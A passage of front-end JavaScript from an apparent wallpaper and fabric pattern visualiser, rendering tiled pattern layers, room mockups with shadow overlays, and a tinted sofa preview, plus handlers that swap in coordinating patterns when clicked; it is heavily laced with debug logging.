                    await new Promise((resolve) => {
                        processImage(layer.path, (processedCanvas) => {
                            if (processedCanvas instanceof HTMLCanvasElement) {
                                const scale = (appState.currentScale / 100 || 1) * (appState.scaleMultiplier || 1);
                                const tileWidth = processedCanvas.width * scale;
                                const tileHeight = processedCanvas.height * scale;
                                
                                patternCtx.globalCompositeOperation = isShadow ? ""multiply"" : ""source-over"";
                                patternCtx.globalAlpha = isShadow ? 0.3 : 1.0;
                                
                                for (let x = -tileWidth; x < canvas.width + tileWidth; x += tileWidth) {
                                    const isOddColumn = Math.floor((x + tileWidth) / tileWidth) % 2 !== 0;
                                    const yOffset = isHalfDrop && isOddColumn ? tileHeight / 2 : 0;
                                    console.log(`🔄 Column at x=${x}, isOdd=${isOddColumn}, yOffset=${yOffset}`);
                                    
                                    for (let y = -tileHeight + yOffset; y < canvas.height + tileHeight; y += tileHeight) {
                                        patternCtx.drawImage(processedCanvas, x, y, tileWidth, tileHeight);
                                    }
                                }
                                console.log(`✅ Regular layer ${i} rendered with color ${layerColor}`);
                            }
                            resolve();
                        }, layerColor, 2.2, isShadow, false, false);
                    });
                        
                    }
                    
                    ctx.drawImage(patternCanvas, 0, 0);
                    console.log(""🔍 Pattern canvas drawn to main canvas"");
                }
            }
            console.log(""🔍 Finished pattern processing, moving to collection mockup check"");

            console.log(""🔍 Full selectedCollection:"", Object.keys(appState.selectedCollection));
            console.log(""🔍 selectedCollection object:"", appState.selectedCollection);
            console.log(""🔍 selectedCollection.mockup:"", appState.selectedCollection?.mockup);
            console.log(""🔍 selectedCollection.mockupShadow:"", appState.selectedCollection?.mockupShadow);


            // Apply mockup overlay if exists
            if (appState.selectedCollection?.mockup) {
                const originalPath = appState.selectedCollection.mockup;
                const normalizedPath = normalizePath(originalPath);
                console.log(`🏠 Loading collection mockup:`);
                console.log(`  Original: ${originalPath}`);
                console.log(`  Normalized: ${normalizedPath}`);
                const mockupImage = new Image();
                mockupImage.crossOrigin = ""Anonymous"";
                mockupImage.src = normalizedPath;
                
                await new Promise((resolve) => {
                    mockupImage.onload = () => {
                        console.log(`✅ Collection mockup loaded: ${mockupImage.width}x${mockupImage.height}`);
                        const fit = scaleToFit(mockupImage, canvas.width, canvas.height);
                        ctx.drawImage(mockupImage, fit.x, fit.y, fit.width, fit.height);
                        console.log(`📐 Mockup drawn at: ${fit.x}, ${fit.y}, ${fit.width}x${fit.height}`);
                        
                        console.log(""🔍 selectedCollection:"", appState.selectedCollection?.name);
                        console.log(""🔍 selectedCollection.elements:"", appState.selectedCollection?.elements);
                        resolve();
                    };
                    mockupImage.onerror = (e) => {
                        console.error(`❌ Failed to load collection mockup: ${normalizedPath}`, e);
                        console.error(`❌ Actual URL that failed: ${mockupImage.src}`);
                        resolve();
                    };
                });
            }

            // Apply shadow overlay if exists
            if (appState.selectedCollection?.mockupShadow) {
                const shadowOriginalPath = appState.selectedCollection.mockupShadow;
                const shadowNormalizedPath = normalizePath(shadowOriginalPath);
                console.log(`🌫️ Loading collection shadow:`);
                console.log(`  Original: ${shadowOriginalPath}`);
                console.log(`  Normalized: ${shadowNormalizedPath}`);
                const shadowOverlay = new Image();
                shadowOverlay.crossOrigin = ""Anonymous"";
                shadowOverlay.src = shadowNormalizedPath;
                
                await new Promise((resolve) => {
                    shadowOverlay.onload = () => {
                        console.log(`✅ Collection shadow loaded: ${shadowOverlay.width}x${shadowOverlay.height}`);
                        ctx.globalCompositeOperation = ""multiply"";
                        const fit = scaleToFit(shadowOverlay, canvas.width, canvas.height);
                        ctx.drawImage(shadowOverlay, fit.x, fit.y, fit.width, fit.height);
                        console.log(`🌫️ Shadow drawn at: ${fit.x}, ${fit.y}, ${fit.width}x${fit.height}`);
                        ctx.globalCompositeOperation = ""source-over"";
                        resolve();
                    };
                    shadowOverlay.onerror = (e) => {
                        console.error(`❌ Failed to load shadow overlay: ${shadowNormalizedPath}`, e);
                        console.error(`❌ Actual shadow URL that failed: ${shadowOverlay.src}`);
                        resolve();
                    };
                });
            } else {
                console.warn(""⚠️ No mockup found for collection:"", appState.selectedCollection?.name);
                console.log(""🔍 Available collection properties:"", Object.keys(appState.selectedCollection || {}));
            }

            // Render final canvas with CORS error handling
            let dataUrl;
            try {
                dataUrl = canvas.toDataURL(""image/png"");
                console.log(""✅ Room mockup canvas exported successfully"");
            } catch (e) {
                if (e.name === 'SecurityError') {
                    console.log(""🛡️ Room mockup CORS error - using canvas directly in DOM"");
                    // Instead of using dataURL, append the canvas directly
                    canvas.style.cssText = ""width: 100%; height: 100%; object-fit: contain; border: 1px solid #333;"";
                    dom.roomMockup.innerHTML = """";
                    dom.roomMockup.appendChild(canvas);
                    console.log(""✅ Room mockup canvas appended directly to DOM"");
                    ensureButtonsAfterUpdate();
                    // Reset all styling including background from fabric mode
                    dom.roomMockup.style.cssText = ""width: 600px; height: 450px; position: relative; background-image: none; background-color: #434341;"";
                    return; // Exit early, don't create img element
                }
                throw e; // Re-throw non-CORS errors
            }
            
            const img = document.createElement(""img"");
            img.src = dataUrl;
            img.style.cssText = ""width: 100%; height: 100%; object-fit: contain; border: 1px solid #333;"";
            
            img.onload = () => {
                console.log(""✅ Room mockup image loaded successfully"");
            };
            img.onerror = (e) => {
                console.error(""❌ Room mockup image failed to load:"", e);
            };
            
            dom.roomMockup.innerHTML = """";
            dom.roomMockup.appendChild(img);
            console.log(""✅ Room mockup image appended to DOM"");
            ensureButtonsAfterUpdate();
            dom.roomMockup.style.cssText = ""width: 600px; height: 450px; position: relative; background: #434341;"";
        };

        await processOverlay().catch(error => {
            console.error(""Error processing room mockup:"", error);
        });

    } catch (e) {
        console.error('Error in updateRoomMockup:', e);
    }
};
// GUARD / TRACE WRAPPER
if (USE_GUARD && DEBUG_TRACE) {
updateRoomMockup = guard(traceWrapper(updateRoomMockup, ""updateRoomMockup"")); // Wrapped for debugging
} else if (USE_GUARD) {
    updateRoomMockup = guard(updateRoomMockup, ""updateRoomMockup""); // Wrapped for debugging
}

const updateFurniturePreview = async () => {
// Add this at the start of updateFurniturePreview()
const layerMapping = getLayerMappingForPreview(true);
console.log(""🔍 LAYER MAPPING DEBUG IN FURNITURE PREVIEW:"");
console.log(""  wallIndex:"", layerMapping.wallIndex);
console.log(""  backgroundIndex:"", layerMapping.backgroundIndex);  
console.log(""  patternStartIndex:"", layerMapping.patternStartIndex);
console.log(""  Expected: wallIndex=0, backgroundIndex=1, patternStartIndex=2"");

    try {
        console.log(""🛋️ ========================="");
        console.log(""🛋️ Starting furniture preview"");
        console.log(""🛋️ ========================="");

            const frozenZoomState = {
            scale: furnitureViewSettings.scale,
            offsetX: furnitureViewSettings.offsetX,
            offsetY: furnitureViewSettings.offsetY,
            isZoomed: furnitureViewSettings.isZoomed,
            timestamp: Date.now()
        };
        
        console.log(""🔒 FROZEN zoom state for all layers:"", frozenZoomState);

        
        // 🔍 ADD THIS DEBUG LINE:
        console.log(""🔍 ENTRY POINT - Current furnitureViewSettings:"", JSON.stringify(furnitureViewSettings, null, 2));
        
        // ✅ PRESERVE ZOOM SETTINGS ONCE AT THE START
        const preservedSettings = {
            scale: furnitureViewSettings.scale,
            offsetX: furnitureViewSettings.offsetX,
            offsetY: furnitureViewSettings.offsetY,
            isZoomed: furnitureViewSettings.isZoomed
        };

        
        console.log(""🔒 Preserved zoom settings:"", preservedSettings);

        // Basic validation
        if (!dom.roomMockup) {
            console.error(""❌ roomMockup element not found in DOM"");
            return;
        }

        if (!appState.currentPattern) {
            console.error(""❌ No current pattern selected"");
            return;
        }

        // Ensure furniture config is loaded
        if (!furnitureConfig) {
            console.log(""🔄 Loading furniture config..."");
            await loadFurnitureConfig();
        }

        if (!furnitureConfig) {
            console.error(""❌ furnitureConfig still not loaded after attempt"");
            return;
        }

        // Setup canvas
        const canvas = document.createElement(""canvas"");
        canvas.width = 600;
        canvas.height = 450;
        const ctx = canvas.getContext(""2d"");

        // Get collection and pattern data
        const collection = appState.selectedCollection;
        const pattern = appState.currentPattern;
        const furnitureType = collection?.furnitureType || 'sofa-capitol';
        const furniture = furnitureConfig?.[furnitureType];

        // Debug furniture config
        console.log(""🔍 FURNITURE CONFIG DEBUG:"");
        console.log(""  Collection name:"", collection?.name);
        console.log(""  Furniture type:"", furnitureType);
        console.log(""  Available furniture configs:"", Object.keys(furnitureConfig || {}));
        console.log(""  Selected furniture config exists:"", !!furniture);

        if (!furniture) {
            console.error(""❌ No furniture config found for:"", furnitureType);
            console.log(""Available configs:"", Object.keys(furnitureConfig));
            return;
        }

        // Debug furniture paths
        console.log(""🔍 FURNITURE PATHS DEBUG:"");
        console.log(""  Mockup path:"", furniture.mockup);
        console.log(""  Wall mask path:"", furniture.wallMask);
        console.log(""  Base path:"", furniture.base);
        console.log(""  Extras path:"", furniture.extras);

        // Test if files exist
        const testPaths = [
            { name: ""mockup"", path: furniture.mockup },
            { name: ""wallMask"", path: furniture.wallMask },
            { name: ""base"", path: furniture.base },
            { name: ""extras"", path: furniture.extras }
        ];

        console.log(""🔍 TESTING FILE EXISTENCE:"");
        testPaths.forEach(({ name, path }) => {
            if (path) {
                const testImg = new Image();
                testImg.onload = () => console.log(`✅ ${name} file exists: ${path}`);
                testImg.onerror = () => console.log(`❌ ${name} file MISSING: ${path}`);
                testImg.src = normalizePath(path);
            } else {
                console.log(`⚠️ ${name} path not defined in config`);
            }
        });

        // Get layer mapping for furniture collection
        const layerMapping = getLayerMappingForPreview(true); // Always true for furniture
        console.log(""🔍 LAYER MAPPING DEBUG:"");
        console.log(""  Layer mapping:"", layerMapping);
        console.log(""  Total current layers:"", appState.currentLayers.length);

        // Debug current layer assignments
        console.log(""🔍 CURRENT LAYER ASSIGNMENTS:"");
        appState.currentLayers.forEach((layer, index) => {
            let usage = ""unused"";
            if (index === layerMapping.wallIndex) usage = ""wall color"";
            else if (index === layerMapping.backgroundIndex) usage = ""sofa base color"";
            else if (index >= layerMapping.patternStartIndex) usage = `pattern layer ${index - layerMapping.patternStartIndex}`;
            
            console.log(`  ${index}: ${layer.label} = ""${layer.color}"" (${usage})`);
        });

        // Clear canvas with white background
        ctx.fillStyle = ""transparent"";
        ctx.fillRect(0, 0, 600, 450);
        console.log(""🧹 Canvas cleared with white background"");
        ctx.clearRect(0, 0, 600, 450);
        ctx.fillStyle = ""#F5F5F5"";
        ctx.fillRect(0, 0, 600, 450);



        // ❌ REMOVED: The problematic settings update that was resetting zoom
        // NO LONGER UPDATING furnitureViewSettings here - using preserved settings

        console.log(""🔍 FURNITURE VIEW SETTINGS:"");
        console.log(""  Scale:"", furnitureViewSettings.scale);
        console.log(""  Offset X:"", furnitureViewSettings.offsetX);
        console.log(""  Offset Y:"", furnitureViewSettings.offsetY);

        try {
        console.log(""🏗️ ========================="");
        console.log(""🏗️ FURNITURE RENDERING SEQUENCE (WITH WALL MASK)"");
        console.log(""🏗️ ========================="");
        
        // ===== STEP 1: Draw room mockup base =====
        console.log(""1️⃣ Drawing mockup base (room scene)"");
        const mockupPath = furniture.mockup;
        if (mockupPath) {
            console.log(""  Mockup path:"", mockupPath);
            await drawFurnitureLayer(ctx, mockupPath).catch(err => {
                console.error(""❌ Failed to load mockup:"", err);
                zoomState: frozenZoomState
                ctx.fillStyle = ""#E5E7EB"";
                ctx.fillRect(0, 0, 600, 450);
                console.log(""🔄 Drew fallback background due to mockup failure"");
            });
            console.log(""✅ Room mockup base drawn"");
        } else {
            console.error(""❌ No mockup path in furniture config"");
            ctx.fillStyle = ""#E5E7EB"";
            ctx.fillRect(0, 0, 600, 450);
        }
        
        // ===== STEP 2: Draw wall color using wall mask =====
        console.log(""2️⃣ Drawing wall color via mask"");
        const wallColor = resolveColor(appState.currentLayers[layerMapping.wallIndex]?.color || ""Snowbound"");
        console.log(`  Wall color from input ${layerMapping.wallIndex}: ${wallColor}`);
        
        if (furniture.wallMask) {
            console.log(""  Wall mask path:"", furniture.wallMask);
            await drawFurnitureLayer(ctx, furniture.wallMask, {
                tintColor: wallColor,
                isMask: true,
                zoomState: frozenZoomState
            });
            console.log(""✅ Wall color applied via mask"");
        } else {
            console.error(""❌ No wallMask path in furniture config"");
            console.log(""  Available furniture config keys:"", Object.keys(furniture));
        }

        // TEST: Try to load the wall mask image manually
        console.log(""🧪 TESTING WALL MASK IMAGE LOAD:"");
        try {
            const testMaskImg = new Image();
            testMaskImg.onload = () => {
                console.log(`✅ Wall mask loaded successfully: ${furniture.wallMask}`);
                console.log(`  Dimensions: ${testMaskImg.naturalWidth}x${testMaskImg.naturalHeight}`);
                console.log(`  Image appears valid for masking`);
            };
            testMaskImg.onerror = (err) => {
                console.log(`❌ Wall mask failed to load: ${furniture.wallMask}`);
                console.log(`  Error:`, err);
                console.log(`  This is why wall color fills entire canvas!`);
            };
            testMaskImg.src = normalizePath(furniture.wallMask);
        } catch (e) {
            console.log(`❌ Error testing wall mask: ${e.message}`);
        }

        // ===== STEP 3: Draw sofa base =====
        console.log(""3️⃣ Drawing sofa base - USING MAPPING"");

        // ✅ Use the layer mapping to get the correct background index
        const backgroundIndex = layerMapping.backgroundIndex;

        
        const backgroundLayer = appState.currentLayers[backgroundIndex];
        const sofaBaseColor = resolveColor(backgroundLayer?.color || ""#FAFAFA"");

        // ✅ ENHANCED DEBUG - Let's catch the bug red-handed
        console.log(""🔍 SOFA BASE COLOR RESOLUTION DEBUG:"");
        console.log(""  backgroundIndex:"", backgroundIndex);
        console.log(""  backgroundLayer:"", backgroundLayer);
        console.log(""  backgroundLayer.label:"", backgroundLayer?.label);
        console.log(""  backgroundLayer.color:"", backgroundLayer?.color);
        console.log(""  sofaBaseColor resolved to:"", sofaBaseColor);

        // ✅ ALSO CHECK: What does resolveColor actually return?
        console.log(""  resolveColor direct test:"", resolveColor(backgroundLayer?.color));
        console.log(""  lookupColor direct test:"", lookupColor(backgroundLayer?.color));


        console.log(`  Sofa base color from input ${backgroundIndex} (${appState.currentLayers[backgroundIndex]?.label}): ${sofaBaseColor}`);

        if (furniture.base) {
            console.log(""  🛋️ Sofa base path exists:"", furniture.base);
            console.log(""  🛋️ Calling drawFurnitureLayer for sofa base..."");
            
            // ✅ ENSURE SOFA BASE COMPLETES BEFORE PATTERNS
            console.log(""🐛 ABOUT TO DRAW SOFA BASE:"");
        console.log(""  furniture.base path:"", furniture.base);
        console.log(""  Should be: data/furniture/sofa-capitol/sofa-capitol-base.png"");
        console.log(""  Tint color:"", sofaBaseColor);

            try {
                await drawFurnitureLayer(ctx, furniture.base, {
                    tintColor: sofaBaseColor,
                    zoomState: frozenZoomState
                });
                console.log(""  ✅ Sofa base step completed - CONFIRMED"");
            } catch (error) {
                console.error(""  ❌ Sofa base failed:"", error);
            }

                // ✅ Then: Add shadow layer with multiply blend (no UI input needed)
                const shadowPath = furniture.baseShadow || furniture.base.replace('.png', '-shadow.png');
                console.log(""  🌚 Adding sofa base shadow..."");
                
                await drawFurnitureLayer(ctx, shadowPath, {
                    tintColor: null,  // No tinting for shadow
                    zoomState: frozenZoomState,
                    blendMode: ""multiply"",  // Multiply blend for shadow
                    opacity: 0.7  // Adjust shadow intensity
                });
                console.log(""  ✅ Sofa base shadow completed"");

        } else {
            console.error(""❌ No base path in furniture config"");
        }

        // ✅ ADD DELAY TO ENSURE SOFA BASE IS FULLY RENDERED
        console.log(""⏳ Waiting for sofa base to complete before patterns..."");
        await new Promise(resolve => setTimeout(resolve, 50));
    

            // ===== STEP 4: Draw pattern layers =====
            console.log(""4️⃣ Drawing pattern layers - ENHANCED DEBUG"");
            console.log(`  Total pattern layers to process: ${pattern.layers.length}`);
            console.log(`  Pattern layer start index: ${layerMapping.patternStartIndex}`);
            console.log(`  Available inputs: ${appState.currentLayers.length}`);

            // Show all current inputs
            console.log(""  📋 ALL CURRENT INPUTS:"");
            appState.currentLayers.forEach((layer, idx) => {
                console.log(`    Input ${idx}: ${layer.label} = ""${layer.color}""`);
            });

            console.log(""  🎨 PATTERN LAYER MAPPING:"");
            for (let i = 0; i < pattern.layers.length; i++) {

                const layer = pattern.layers[i];
                const furnitureInputIndex = layerMapping.patternStartIndex + i;
                const inputLayer = appState.currentLayers[furnitureInputIndex];
                const layerColor = resolveColor(inputLayer?.color || ""Snowbound"");
                
                console.log(`  📐 Pattern layer ${i}:`);
                console.log(`    Layer path: ${layer.path?.split('/').pop()}`);
                console.log(`    Maps to input ${furnitureInputIndex}: ${inputLayer?.label} = ""${inputLayer?.color}""`);
                console.log(`    Resolved color: ${layerColor}`);
                console.log(`    Input exists: ${!!inputLayer}`);
                
                if (layerColor && layer.path) {
                    try {
                        console.log(`    🎨 Using processImage for pattern layer ${i} with color ${layerColor}`);
                        
                if (layerColor && layer.path) {
                    try {
                        await drawFurnitureLayer(ctx, layer.path, {
                            tintColor: layerColor,
                            zoomState: frozenZoomState,
                            highRes: true  // ✅ Enable high-res for patterns

                        });
                        console.log(`    ✅ Pattern layer ${i} rendered in high resolution`);
                    } catch (error) {
                        console.error(`    ❌ Failed to render pattern layer ${i}:`, error);
                    }
                }        
                    } catch (error) {
                        console.error(`    ❌ Failed to render pattern layer ${i}:`, error);
                    }
                } else {
                    console.warn(`    ⚠️ Skipping pattern layer ${i}: missing color or path`);
                }
            }        
            console.log(""✅ Pattern layers step completed"");

            // ✅ NEW STEP 4.5: Add sofa base shadow AFTER patterns
            console.log(""4️⃣.5 Adding sofa base shadow on top of patterns"");

            const shadowPath = furniture.baseShadow || furniture.base.replace('.png', '-shadow.png');
            if (shadowPath && furniture.base) {
                console.log(""  🌚 Drawing shadow on top of patterns..."");
                
                try {
                    await drawFurnitureLayer(ctx, shadowPath, {
                        tintColor: null,  // No tinting for shadow
                        zoomState: frozenZoomState,
                        blendMode: ""multiply"",  // Multiply blend for shadow effect
                        opacity: 0.7  // Adjust shadow intensity as needed
                    });
                    console.log(""  ✅ Shadow applied on top of patterns"");
                } catch (error) {
                    console.log(""  ⚠️ Shadow file not found, skipping:"", shadowPath);
                }
            } else {
                console.log(""  ⚠️ No shadow path defined, skipping shadow"");
            }

            
            // ===== STEP 5: Draw extras on top =====
            console.log(""5️⃣ Drawing extras"");
            if (furniture.extras) {
                console.log(""  Extras path:"", furniture.extras);
                console.log(""  Drawing extras without tint (natural colors)"");
                
                try {
                    await drawFurnitureLayer(ctx, furniture.extras, {
                        tintColor: null,
                        zoomState: frozenZoomState,
                        opacity: 1.0,
                        blendMode: ""source-over""
                    });
                    console.log(""✅ Extras step completed"");
                } catch (error) {
                    console.error(""❌ Failed to draw extras:"", error);
                }
            } else {
                console.warn(""⚠️ No extras defined in furniture config"");
            }
            
            console.log(""🎉 ========================="");
            console.log(""🎉 FURNITURE RENDERING COMPLETE (WITH WALL MASK)"");
            console.log(""🎉 ========================="");

            
            // ===== STEP 6: Display result =====
            console.log(""6️⃣ Displaying result"");
            const dataUrl = canvas.toDataURL(""image/png"");
            const img = document.createElement(""img"");
            img.src = dataUrl;
            img.style.cssText = ""width: 100%; height: 100%; object-fit: contain;"";
            
            // Clear and append to DOM
            dom.roomMockup.innerHTML = """";
            dom.roomMockup.appendChild(img);
            // Reset all styling including background from fabric mode
            dom.roomMockup.style.cssText = ""width: 600px; height: 450px; position: relative; background-image: none; background-color: var(--color-bg-medium);"";
            ensureButtonsAfterUpdate();

            
            console.log(""✅ Furniture preview displayed in DOM"");
            console.log(""📊 Final canvas dimensions:"", canvas.width, ""x"", canvas.height);
            console.log(""📊 DataURL length:"", dataUrl.length);
            
        } catch (renderError) {
            console.error(""❌ Error in furniture rendering sequence:"", renderError);
            console.error(""❌ Error stack:"", renderError.stack);
            
            // Fallback: show error message in mockup area
            dom.roomMockup.innerHTML = `
                <div style=""
                    width: 100%; 
                    height: 100%; 
                    display: flex; 
                    align-items: center; 
                    justify-content: center; 
                    background: #f3f4f6; 
                    color: #dc2626;
                    font-family: monospace;
                    text-align: center;
                    padding: 20px;
                "">
                    <div>
                        <div style=""font-size: 24px; margin-bottom: 10px;"">⚠️</div>
                        <div>Furniture Preview Error</div>
                        <div style=""font-size: 12px; margin-top: 10px;"">Check console for details</div>
                    </div>
                </div>
            `;
        }

        // ✅ RESTORE PRESERVED SETTINGS AT THE END
        Object.assign(furnitureViewSettings, preservedSettings);
        console.log(""✅ Zoom settings restored after rendering:"", furnitureViewSettings);

    } catch (mainError) {
        console.error(""🔥 Critical error in updateFurniturePreview:"", mainError);
        console.error(""🔥 Error stack:"", mainError.stack);
        
        // Ultimate fallback
        if (dom.roomMockup) {
            dom.roomMockup.innerHTML = `
                <div style=""
                    width: 100%; 
                    height: 100%; 
                    display: flex; 
                    align-items: center; 
                    justify-content: center; 
                    background: #fef2f2; 
                    color: #dc2626;
                    font-family: monospace;
                "">
                    Critical furniture preview error - check console
                </div>
            `;
        }
    }
};
        
    function parseCoordinateFilename(filename) {

        console.log('Before click - Scroll Y:', window.scrollY);


        const parts = filename.split('/');
        const filePart = parts[5]; // ""BOMBAY-KITANELLI-VINE.jpg""
        const collectionName = 'coordinates';
        const patternPart = filePart
            .replace(/^BOMBAY-/, '') // Remove ""BOMBAY-""
            .replace(/\.jpg$/i, ''); // Remove "".jpg""
        const patternName = patternPart
            .split('-')
            .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
            .join(' ');
        // No mapping needed to match JSON
        const normalizedPatternName = patternName;
        console.log(`Parsed filename: ${filename} â†’ collection: ${collectionName}, pattern: ${normalizedPatternName}`);
        return { collectionName, patternName: normalizedPatternName };
    }

    function loadPatternFromLocalCollections(collectionName, patternName) {
        try {
            if (!appState.collections || !appState.collections.length) {
                console.error(""appState.collections is empty or not initialized"");
                return null;
            }
            const collection = appState.collections.find(
                c => c.name.toLowerCase() === ""coordinates""
            );
            if (!collection) {
                console.error(""Coordinates collection not found in appState.collections"");
                return null;
            }
            const pattern = collection.patterns.find(
                p => p.name.toLowerCase() === patternName.toLowerCase()
            );
            if (!pattern) {
                console.error(`Pattern ${patternName} not found in coordinates collection`);
                return null;
            }
            console.log(`Loaded pattern: ${pattern.name} from coordinates collection`);
            return { collection, pattern };
        } catch (error) {
            console.error(`Error accessing collections: ${error.message}`);
            return null;
        }
    }

    function setupCoordinateImageHandlers() {
        const coordinateImages = document.querySelectorAll("".coordinate-image"");
        console.log(`Found ${coordinateImages.length} coordinate images`);
        coordinateImages.forEach(image => {
            image.removeEventListener(""click"", handleCoordinateClick);
            image.addEventListener(""click"", handleCoordinateClick);
        });
    
        function handleCoordinateClick() {
            const image = this;
            console.log('>>> handleCoordinateClick START <<<');
        
            // Only store original state if not already stored
            if (!appState.originalPattern) {
                appState.originalPattern = { ...appState.currentPattern };
                appState.originalCoordinates = appState.selectedCollection?.coordinates ? [...appState.selectedCollection.coordinates] : [];
                appState.originalLayerInputs = appState.layerInputs.map((layer, index) => ({
                    id: `layer-${index}`,
                    label: layer.label,
                    inputValue: layer.input.value,
                    hex: layer.circle.style.backgroundColor,
                    isBackground: layer.isBackground
                }));
                appState.originalCurrentLayers = appState.currentLayers.map(layer => ({ ...layer }));
                console.log(""Stored original state:"", {
                    pattern: appState.originalPattern.name,
                    coordinates: appState.originalCoordinates,
                    layerInputs: appState.originalLayerInputs,
                    currentLayers: appState.originalCurrentLayers
                });
            }
        
            // Highlight selected image
            document.querySelectorAll("".coordinate-image"").forEach(img => img.classList.remove(""selected""));
            image.classList.add(""selected"");
        
            const filename = image.dataset.filename;
            console.log(`Coordinate image clicked: ${filename}`);
        
            // Find the coordinate
            const coordinate = appState.selectedCollection?.coordinates?.find(coord => coord.path === filename);
            if (!coordinate) {
                console.error(`Coordinate not found for filename: ${filename}`);
                if (dom.coordinatesContainer) {
                    dom.coordinatesContainer.innerHTML += ""<p style='color: red;'>Error: Coordinate not found.</p>"";
                }
                return;
            }
            console.log(`Found coordinate:`, coordinate);
        
            // Find the primary pattern layer index (non-background, non-shadow)
            const primaryLayerIndex = appState.currentLayers.findIndex(layer => 
                layer.label !== ""Background"" &&  
                !layer.imageUrl?.toUpperCase().includes(""ISSHADOW"")
            );
            if (primaryLayerIndex === -1) {
                console.error(""No primary pattern layer found in appState.currentLayers:"", appState.currentLayers);
                return;
            }
            console.log(`Primary layer index: ${primaryLayerIndex}`);
        
            // Determine layers to use (handle both layerPath and layerPaths)
            const layerPaths = coordinate.layerPaths || (coordinate.layerPath ? [coordinate.layerPath] : []);
            if (layerPaths.length === 0) {
                console.error(`No layers found for coordinate: ${filename}`);
                return;
            }
        
            // Load the first coordinate image to get its dimensions
            const coordImage = new Image();
            const normalizedCoordPath = normalizePath(layerPaths[0]);
            console.log(`🔍 Coordinate click path: ""${layerPaths[0]}"" → normalized: ""${normalizedCoordPath}""`);
            coordImage.src = normalizedCoordPath;
            coordImage.onload = () => {
                // Limit coordinate image dimensions to prevent oversized canvases
                const maxDimension = 400;
                const naturalWidth = coordImage.naturalWidth;
                const naturalHeight = coordImage.naturalHeight;
                const scale = Math.min(maxDimension / naturalWidth, maxDimension / naturalHeight, 1);
                const imageWidth = Math.floor(naturalWidth * scale);
                const imageHeight = Math.floor(naturalHeight * scale);
                
                console.log(`📐 Coordinate image sizing: natural(${naturalWidth}x${naturalHeight}) → scaled(${imageWidth}x${imageHeight})`);    
        
                // Create layers and labels for all coordinate layers
                const layers = layerPaths.map(path => ({ path }));
                const layerLabels = layerPaths.map((_, index) => index === 0 ? ""Flowers"" : `Layer ${index + 1}`);
        
                // Update currentPattern with coordinate data
                appState.currentPattern = {
                    ...appState.currentPattern,
                    name: coordinate.filename.replace(/\.jpg$/, ''),
                    thumbnail: coordinate.path,
                    size: [imageWidth / 100, imageHeight / 100], // Convert pixels to inches (assuming 100 DPI)
                    layers: layers, // All coordinate layers
                    layerLabels: layerLabels,
                    tintWhite: false
                };
                console.log(`Updated appState.currentPattern:`, appState.currentPattern);
        
                // Update the primary pattern layer's imageUrl in currentLayers
                appState.currentLayers = appState.currentLayers.map((layer, index) => {
                    if (index === primaryLayerIndex) {
                        console.log(`Updating layer at index ${index} with layerPath: ${layerPaths[0]}`);
                        return {
                            ...layer,
                            imageUrl: layerPaths[0] // Update primary layer
                        };
                    }
                    return layer;
                });
        
                // Preserve the original layer structure and colors
                const currentColors = appState.layerInputs.map(layer => layer.input.value);
                console.log(""Preserving colors:"", currentColors);
        
                // Restore layer inputs with preserved colors
                appState.layerInputs = [];
                if (dom.layerInputsContainer) dom.layerInputsContainer.innerHTML = """";
                appState.currentLayers.forEach((layer, index) => {
                const id = `layer-${index}`;
                const isBackground = layer.label === ""Background"";
                const initialColor = currentColors[index] || (isBackground ? ""#FFFFFF"" : ""Snowbound"");
                const layerData = createColorInput(layer.label, id, initialColor, isBackground);
                layerData.input.value = toInitialCaps(initialColor.replace(/^(SW|SC)\d+\s*/i, """").trim());
                layerData.circle.style.backgroundColor = lookupColor(initialColor) || ""#FFFFFF"";
                
                // ✅ ADD THIS LINE - append to DOM
                dom.layerInputsContainer.appendChild(layerData.container);
                
                appState.layerInputs[index] = layerData;
                console.log(`Set ${layer.label} input to ${layerData.input.value}, circle to ${layerData.circle.style.backgroundColor}, id=${id}`);
            });

        
                // Update UI
                // updatePreview();
                // const isFurniturePattern = appState.currentPattern?.isFurniture || false;

                
                updatePreview();
                
                // Check if we're in fabric mode - if so, only render fabric mockup
                if (appState.isInFabricMode) {
                    console.log(""🧵 handleCoordinateClick in fabric mode - calling renderFabricMockup()"");
                    renderFabricMockup();
                } else {
                    updateRoomMockup();
                }
        
                // Add ""Back to Pattern"" link
                console.log(""🔍 Adding Back to Pattern button..."");
                const coordinatesContainer = document.getElementById(""coordinatesContainer"");
                console.log(""🔍 coordinatesContainer found:"", !!coordinatesContainer);
                if (coordinatesContainer) {
                    let backLink = document.getElementById(""backToPatternLink"");
                    if (backLink) {
                        console.log(""🔍 Removing existing back link"");
                        backLink.remove();
                    }
                    backLink = document.createElement(""div"");
                    backLink.id = ""backToPatternLink"";
                    backLink.style.cssText = `
                        color: #f0e6d2 !important;
                        font-family: 'Island Moments', cursive !important;
                        font-size: 1.8rem !important;
                        text-align: center !important;
                        cursor: pointer !important;
                        margin-top: 6rem !important;
                        padding: 0.5rem !important;
                        transition: color 0.2s !important;
                        display: block !important;
                        visibility: visible !important;
                        opacity: 1 !important;
                        z-index: 1000 !important;
                        position: relative !important;
                    `;
                    backLink.textContent = ""  ← Back to Pattern "";
                    backLink.addEventListener(""mouseover"", () => {
                        backLink.style.color = ""#beac9f"";
                    });
                    backLink.addEventListener(""mouseout"", () => {
                        backLink.style.color = ""#f0e6d2"";
                    });
                    coordinatesContainer.appendChild(backLink);
                    backLink.addEventListener(""click"", restoreOriginalPattern);
                    console.log(""✅ Back to Pattern button added successfully"");
                } else {
                    console.error(""❌ coordinatesContainer not found - cannot add back link"");
                }
            };
            coordImage.onerror = () => {
                console.error(`Failed to load coordinate image: ${layerPaths[0] || coordinate.layerPath}`);
            };
        }
    }

    function restoreOriginalPattern() {
    try {
        console.log('>>> restoreOriginalPattern START <<<');

        if (!appState.originalPattern || !appState.originalCurrentLayers || !appState.originalLayerInputs) {
            console.warn(""No original state to restore"", {
                originalPattern: appState.originalPattern,
                originalCurrentLayers: appState.originalCurrentLayers,
                originalLayerInputs: appState.originalLayerInputs
            });
            return;
        }
        console.log(""Restoring original pattern:"", appState.originalPattern.name, 
                    ""Original state:"", {
                        layerInputs: appState.originalLayerInputs,
                        currentLayers: appState.originalCurrentLayers
                    });

        // Restore appState to the original pattern
        appState.currentPattern = { ...appState.originalPattern };
        appState.currentLayers = appState.originalCurrentLayers.map(layer => ({ ...layer }));
        console.log(""Restored appState: collection="", appState.selectedCollection.name, 
                    ""pattern="", appState.currentPattern.name);

        // Restore layer inputs

        appState.originalLayerInputs.forEach((layer, index) => {
            const id = layer.id || `layer-${index}`;
